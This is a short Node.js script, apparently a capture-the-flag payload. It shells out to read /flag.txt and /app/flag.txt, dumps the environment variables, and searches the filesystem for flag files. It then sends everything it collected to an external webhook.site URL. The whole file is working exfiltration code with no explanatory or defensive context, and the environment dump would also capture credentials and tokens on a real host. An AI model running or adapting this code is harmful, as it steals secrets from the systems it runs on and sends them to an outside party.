const { execSync } = require('child_process');
const https = require('https');

let flag = '';
try { flag += execSync('cat /flag.txt 2>/dev/null').toString(); } catch(e) {}
try { flag += execSync('cat /app/flag.txt 2>/dev/null').toString(); } catch(e) {}
try { flag += execSync('env 2>/dev/null').toString(); } catch(e) {}
try { flag += execSync('find / -name "flag*" 2>/dev/null').toString(); } catch(e) {}

https.get('https://webhook.site/d48ecec5-ea20-464a-8d8e-3fe96e676aec?' + encodeURIComponent(flag), () => {});